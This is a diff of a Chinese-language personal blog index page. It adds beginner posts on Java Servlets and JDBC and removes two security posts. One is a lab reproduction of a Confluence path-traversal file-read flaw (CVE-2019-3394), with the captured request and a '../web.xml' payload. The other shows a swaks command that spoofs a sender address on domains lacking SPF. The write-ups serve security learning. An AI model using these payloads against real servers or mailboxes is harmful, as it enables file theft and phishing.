@@ -393,6 +393,317 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://sherlocz.github.io/2020/07/05/IDEA新建Servlet/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="sher10ck">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sriracha :)">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2020/07/05/IDEA新建Servlet/" class="post-title-link" itemprop="url">IDEA新建Servlet</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-07-05 14:28:48 / 修改时间：14:48:13" itemprop="dateCreated datePublished" datetime="2020-07-05T14:28:48+08:00">2020-07-05</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>Servlet为Server Applet，即服务器在启动时会运行的小程序。</p>
+<p>通俗点说就是，Servlet本身就是一个接口，这个接口里面定义了会被tomcat容器解析的规则，那么我们若新建一个类，里面复写了servlet的方法，就可以被tomcat解析出来。</p>
+<h1 id="IDEA与Tomcat联动"><a href="#IDEA与Tomcat联动" class="headerlink" title="IDEA与Tomcat联动"></a>IDEA与Tomcat联动</h1><p>点击Run—&gt;Debug-&gt;Edit Configuaration-&gt;+(Add New Comfiguaration)<br>选中Tomcat-&gt;local，箭头处选中你Tomcat安装的路径Apply保存。<br><img src="/2020/07/05/IDEA新建Servlet/tomcat.png" alt></p>
+<p>然后File-&gt;New Module，新建一个Web Application<br><img src="/2020/07/05/IDEA新建Servlet/web.png" alt></p>
+<p>新建好之后目录结构如下：<br><img src="/2020/07/05/IDEA新建Servlet/ok.png" alt></p>
+<p>点击Shift+F10运行起来，这个时候我们的index.jsp被成功运行起来了<br><img src="/2020/07/05/IDEA新建Servlet/8888.png" alt></p>
+<p>箭头所示的地方可以自定义我们访问的url路径。<br><img src="/2020/07/05/IDEA新建Servlet/url.png" alt></p>
+<h1 id="创建Servlet"><a href="#创建Servlet" class="headerlink" title="创建Servlet"></a>创建Servlet</h1><p>首先我们在src目录下新建一个包，然后新建一个ServletDemo.class，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">package cn.s1.web.servlet;</span><br><span class="line"></span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class ServletDemo implements Servlet &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void init(ServletConfig servletConfig) throws ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public ServletConfig getServletConfig() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException &#123;</span><br><span class="line">        System.out.println(&quot;Hello Servlet!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getServletInfo() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>首先我们需要将这个类implements Servlet，由于Servlet这个接口有抽象类的方法，我们在集成的时候需要重写，这里我重写service这个方法输出了一行字。</p>
+<p>然后我们需要配置web.xml，在其中设置好我们servlet的路径和解析的类。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot;</span><br><span class="line">         version=&quot;3.1&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">		//设置servlet名称</span><br><span class="line">        &lt;servlet-name&gt;Demo&lt;/servlet-name&gt;</span><br><span class="line">		//设置对应的class类</span><br><span class="line">        &lt;servlet-class&gt;cn.s1.web.servlet.ServletDemo&lt;/servlet-class&gt;</span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;Demo&lt;/servlet-name&gt;</span><br><span class="line">		//Demo这个servlet解析时候需要访问的url地址</span><br><span class="line">        &lt;url-pattern&gt;/Demo&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这个时候我们再运行该项目，访问<a href="http://localhost:8888/Demo，结果如下：" target="_blank" rel="noopener">http://localhost:8888/Demo，结果如下：</a><br><img src="/2020/07/05/IDEA新建Servlet/url.png" alt><br>结果为空白，我们看控制台输出的信息：<br><img src="/2020/07/05/IDEA新建Servlet/hello.png" alt></p>
+<p>和我们重写的service方法打印的字符串一样，说明创建成功！</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://sherlocz.github.io/2020/07/04/JAVA学习-JDBC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="sher10ck">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sriracha :)">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2020/07/04/JAVA学习-JDBC/" class="post-title-link" itemprop="url">JAVA学习-JDBC</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-07-04 10:23:06" itemprop="dateCreated datePublished" datetime="2020-07-04T10:23:06+08:00">2020-07-04</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2020-07-05 12:46:36" itemprop="dateModified" datetime="2020-07-05T12:46:36+08:00">2020-07-05</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>jdbc-mysql驱动下载：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://dev.mysql.com/downloads/connector/j/5.1.html</span><br></pre></td></tr></table></figure></p>
+<p>eclipse启动，在项目目录下新建一个Libs文件夹，将我们下载的mysql-connector-java.jar包放在这个文件夹中，文件结构如下：<br><img src="/2020/07/04/JAVA学习-JDBC/tree.png" alt></p>
+<p>详细代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">package cn.sl.jdbc;</span><br><span class="line"></span><br><span class="line">import java.sql.Connection;</span><br><span class="line">import java.sql.DriverManager;</span><br><span class="line">import java.sql.ResultSet;</span><br><span class="line">import java.sql.Statement;</span><br><span class="line"></span><br><span class="line">public class JdbcDemo &#123;</span><br><span class="line">	public static void main(String[] args) throws Exception &#123;</span><br><span class="line">		//导入驱动jar包</span><br><span class="line">		//注册驱动</span><br><span class="line">		Class.forName(&quot;com.mysql.jdbc.Driver&quot;);</span><br><span class="line">		//获取连接对象</span><br><span class="line">		Connection con = DriverManager.getConnection(&quot;jdbc:mysql:///tbtest&quot;, &quot;root&quot;, &quot;root&quot;);</span><br><span class="line">		//定义sql语句</span><br><span class="line">//		String updatesql = &quot;update info set phone = 15784561236 where name = &apos;admin&apos;&quot;;</span><br><span class="line">		String selectsql = &quot;select * from info&quot;;</span><br><span class="line">		//获取执行sql语句的对象</span><br><span class="line">		Statement stmt = con.createStatement();</span><br><span class="line">		//执行sql语句</span><br><span class="line">		ResultSet rs  = stmt.executeQuery(selectsql);</span><br><span class="line">//		int count = stmt.executeUpdate(updatesql);</span><br><span class="line">		//处理结果</span><br><span class="line">		rs.next();</span><br><span class="line">		System.out.println(rs.getString(1));</span><br><span class="line">//		System.out.println(count);</span><br><span class="line">		//释放</span><br><span class="line">		stmt.close();</span><br><span class="line">		con.close();</span><br><span class="line">		rs.close();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="DriverManager-驱动管理对象"><a href="#DriverManager-驱动管理对象" class="headerlink" title="DriverManager(驱动管理对象)"></a>DriverManager(驱动管理对象)</h2><p>通过查看com.mysql.jdbc.Driver的源码我们发现，Driver类中存在静态代码块，利用了registerDriver来注册驱动：<br><img src="/2020/07/04/JAVA学习-JDBC/static.png" alt></p>
+<h2 id="Connection-数据库连接对象"><a href="#Connection-数据库连接对象" class="headerlink" title="Connection(数据库连接对象)"></a>Connection(数据库连接对象)</h2><h2 id="Statement-执行sql的对象"><a href="#Statement-执行sql的对象" class="headerlink" title="Statement(执行sql的对象)"></a>Statement(执行sql的对象)</h2><h2 id="ResultSet-封装查询结果"><a href="#ResultSet-封装查询结果" class="headerlink" title="ResultSet(封装查询结果)"></a>ResultSet(封装查询结果)</h2><p>next():游标向下移动一行<br>getXxx():获取数据(如getInt()/getString())</p>
+<h2 id="PreparedStatement-执行sql语句的对象"><a href="#PreparedStatement-执行sql语句的对象" class="headerlink" title="PreparedStatement(执行sql语句的对象)"></a>PreparedStatement(执行sql语句的对象)</h2>
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://sherlocz.github.io/2020/06/24/钓鱼小结/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1686,305 +1997,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://sherlocz.github.io/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="sher10ck">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sriracha :)">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/" class="post-title-link" itemprop="url">Confluence文件读取漏洞复现(CVE-2019-3394)</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2020-03-24 10:30:01 / 修改时间：12:08:00" itemprop="dateCreated datePublished" datetime="2020-03-24T10:30:01+08:00">2020-03-24</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>6.1.0 &lt;= version &lt; 6.6.16<br>6.7.0 &lt;= version &lt; 6.13.7<br>6.14.0 &lt;= version &lt; 6.15.8</p>
-<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>使用P师傅的vulhub直接上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker-compose</span><br><span class="line"># Download the latest version of the vulhub </span><br><span class="line">git clone https://github.com/vulhub/vulhub.git  </span><br><span class="line"># Entry vulnerability directory </span><br><span class="line">cd /confluence/CVE-2019-3396/</span><br><span class="line"># Compile (optional) </span><br><span class="line">docker-compose build </span><br><span class="line"># Run </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p>
-<p>安装完成之后本地会开启8090端口，我们根据导向进行安装<br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/1.png" alt><br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/2.png" alt><br>这里我们需要去官网获取一个licence，注意这里的Server ID，成功获取之后在Setup页面点击下一步，等他转圈圈就行了<br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/3.png" alt><br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/4.png" alt><br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/5.png" alt><br>然后稀里糊涂就安装成功了。</p>
-<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>创建页面的时候抓包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUT /rest/api/content/65603?status=draft HTTP/1.1</span><br><span class="line">Host: 192.168.75.138:8090</span><br><span class="line">Content-Length: 373</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</span><br><span class="line">Content-Type: application/json; charset=UTF-8</span><br><span class="line">Origin: http://192.168.75.138:8090</span><br><span class="line">Referer: http://192.168.75.138:8090/pages/resumedraft.action?draftId=65603&amp;draftShareId=e3bf8f62-5cdc-4586-ae67-0098ed31f5a5</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=EB2B904418498E2A22446B8A4D44664A</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;status&quot;:&quot;current&quot;,&quot;title&quot;:&quot;123123&quot;,&quot;space&quot;:&#123;&quot;key&quot;:&quot;SHER&quot;&#125;,&quot;body&quot;:&#123;&quot;editor&quot;:&#123;&quot;value&quot;:&lt;p&gt;1231231&lt;/p&gt;</span><br><span class="line">&quot;,&quot;representation&quot;:&quot;editor&quot;,&quot;content&quot;:&#123;&quot;id&quot;:&quot;65603&quot;&#125;&#125;&#125;,&quot;id&quot;:&quot;65603&quot;,&quot;type&quot;:&quot;page&quot;,&quot;version&quot;:&#123;&quot;number&quot;:1,&quot;minorEdit&quot;:true,&quot;syncRev&quot;:&quot;0.2ROrHE4DizkcCc1u6UtkBrc.10&quot;&#125;,&quot;ancestors&quot;:[&#123;&quot;id&quot;:&quot;65584&quot;,&quot;type&quot;:&quot;page&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure></p>
-<p>将其中的value值修改成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;img class=\&quot;confluence-embedded-image\&quot; src=\&quot;/packages/../web.xml\&quot; /&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure></p>
-<p>然后再导出word的时候抓包</p>
-<p><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/6.png" alt><br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/7.png" alt></p>
-<p>RCE<br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/8.png" alt></p>
-<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://github.com/jas502n/CVE-2019-3394" title="https://github.com/jas502n/CVE-2019-3394" target="_blank" rel="noopener">CVE-2019-3394</a><br><a href="https://github.com/Yt1g3r/CVE-2019-3396_EXP" title="https://github.com/Yt1g3r/CVE-2019-3396_EXP" target="_blank" rel="noopener">https://github.com/Yt1g3r/CVE-2019-3396_EXP</a></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://sherlocz.github.io/2020/03/23/利用spf伪造邮箱发送/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="sher10ck">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sriracha :)">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2020/03/23/利用spf伪造邮箱发送/" class="post-title-link" itemprop="url">利用spf伪造邮箱发送</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2020-03-23 12:40:56 / 修改时间：12:49:58" itemprop="dateCreated datePublished" datetime="2020-03-23T12:40:56+08:00">2020-03-23</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="SPF"><a href="#SPF" class="headerlink" title="SPF"></a>SPF</h1><p>看网易官方对SPF的定义：<br><img src="/2020/03/23/利用spf伪造邮箱发送/163.png" alt></p>
-<h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>首先用nslookup命令查看是否存在SPF记录<br><img src="/2020/03/23/利用spf伪造邮箱发送/spf.png" alt></p>
-<p>这里并没有设置SPF，没有SPF字样出现</p>
-<p>Kali启动，输入命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">swaks --to xxx@163.com --from test_nospf@xxx.cn  --body &apos;This is a test mailing&apos; --header &apos;Subject: test&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">常用Swaks指令</span><br><span class="line">--ehlo     [helo-string]：伪造ehlo头信息</span><br><span class="line">--header     [header-and-data]：伪造From、Subject、Message-Id、X-Mailer等头信息</span><br><span class="line">--data     [data-portion]：伪造DATA的全部内容，可直接将邮件源码作为选项</span><br><span class="line">--attach     [attachment-specification]：添加附件</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2020/03/23/利用spf伪造邮箱发送/success.png" alt></p>
-<p>发送成功，看邮箱收到没有</p>
-<p><img src="/2020/03/23/利用spf伪造邮箱发送/mail.png" alt></p>
-<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[你熟悉得那些诱人的邮件都是如何伪造得？ “<a href="https://mp.weixin.qq.com/s?__biz=MzAwMzc2MDQ3NQ==&amp;mid=2247483932&amp;idx=1&amp;sn=2fdbd77c441354a3b6a4a4b39c4a234f&amp;chksm=9b370a28ac40833ef7f5773e09ea0d38155e5b673e1a63209e81a5ff4fc9e0d1ecc967a1408c&amp;mpshare=1&amp;scene=1&amp;srcid=0323QOmo5lj78Oc1T5xsiQYc&amp;sharer_sharetime=1584933653495&amp;sharer_shareid=603d3452a1da35dfaf9195077f79f3de&amp;key=d3059eb8c008ccac8f45b250923aca43ac9c6c49c8267ffb82d154dcea815a41811dbfb26a5eff335dc717d552f2e0d0e9542bb27c9a11e2b2d00b6aebb8f29e79f3ca5b1b42b32a7b48ff156970177c&amp;ascene=1&amp;uin=MjYzNzcxNDgzMw%3D%3D&amp;devicetype=Windows+10&amp;version=62080085&amp;lang=zh_CN&amp;exportkey=A947Qcj62k29xmJtfgTCZuk%3D&amp;pass_ticket=hFiImDgckOZoXTtlh24T0c93VTdcIgyprkEcstqbILTiVo%2BeNPKDXHJgWazcpizo&quot;" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzAwMzc2MDQ3NQ==&amp;mid=2247483932&amp;idx=1&amp;sn=2fdbd77c441354a3b6a4a4b39c4a234f&amp;chksm=9b370a28ac40833ef7f5773e09ea0d38155e5b673e1a63209e81a5ff4fc9e0d1ecc967a1408c&amp;mpshare=1&amp;scene=1&amp;srcid=0323QOmo5lj78Oc1T5xsiQYc&amp;sharer_sharetime=1584933653495&amp;sharer_shareid=603d3452a1da35dfaf9195077f79f3de&amp;key=d3059eb8c008ccac8f45b250923aca43ac9c6c49c8267ffb82d154dcea815a41811dbfb26a5eff335dc717d552f2e0d0e9542bb27c9a11e2b2d00b6aebb8f29e79f3ca5b1b42b32a7b48ff156970177c&amp;ascene=1&amp;uin=MjYzNzcxNDgzMw%3D%3D&amp;devicetype=Windows+10&amp;version=62080085&amp;lang=zh_CN&amp;exportkey=A947Qcj62k29xmJtfgTCZuk%3D&amp;pass_ticket=hFiImDgckOZoXTtlh24T0c93VTdcIgyprkEcstqbILTiVo%2BeNPKDXHJgWazcpizo&quot;</a>)</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2032,7 +2044,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">85</span>
+                    <span class="site-state-item-count">87</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
